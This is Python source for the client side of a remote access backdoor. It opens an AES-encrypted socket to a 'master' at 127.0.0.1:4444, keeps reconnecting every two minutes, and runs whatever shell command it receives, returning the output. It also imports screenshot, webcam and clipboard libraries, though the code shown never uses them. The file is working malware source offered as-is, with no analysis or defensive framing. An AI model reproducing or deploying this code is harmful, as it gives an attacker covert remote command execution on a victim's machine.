import sys
import shutil
import socket
import subprocess
import os
import tempfile
import threading
import pyperclip
from time import sleep
from base64 import b64encode, b64decode
from pathlib import Path
import pyscreenshot as ImageGrab
import cv2
from io import BytesIO
from tendo import singleton

# Import custom modules
from my_crypt_func import encode_aes, decode_aes

# Global variables
global thr_block
global thr_exit

def receiver(s) -> str:
    """Receive data from master, decrypt it and return it."""
    lengthcrypt = s.recv(1024).decode('utf-8')
    expected_length = int(decode_aes(lengthcrypt))
    encrypted_received_data = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += s.recv(1024).decode('utf-8')
    return decode_aes(encrypted_received_data)

def sender(s, data_to_send: str) -> None:
    """Encrypt data and send it to master."""
    if not data_to_send:
        data_to_send = 'Ok (no output)\n'
    encoded = encode_aes(data_to_send)
    length = str(len(encoded))
    length_crypt = encode_aes(length)
    s.send(bytes(length_crypt, 'utf-8'))
    sleep(1)
    s.send(bytes(encoded, 'utf-8'))

def command_executor(s, command: str):
    """Execute a command in the system shell and send its output to the master."""
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        sender(s, (proc.stdout.read() + proc.stderr.read()).decode('utf-8'))
    except Exception as exception:
        sender(s, 'reachedexcept')
        sender(s, str(exception))

def backdoor():
    """Shell thread that connects to master and permits control over the agent."""
    while True:
        host = '127.0.0.1'
        port = 4444

        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        while True:
            try:
                s.connect((host, port))
                break
            except Exception as exception:
                print(exception)
                sleep(120)

        while True:
            received_command = receiver(s)
            if received_command != 'KeepAlive':
                if received_command == 'SHquit':
                    sender(s, 'mistochiudendo')
                    break
                elif received_command == 'SHkill':
                    sender(s, 'mistochiudendo')
                    thr_exit.set()
                    break
                else:
                    command_executor(s, received_command)

        s.close()
        sleep(120)

thr_exit = threading.Event()

# Backdoor's thread
thread2 = threading.Thread(name='sic2', target=backdoor).start()
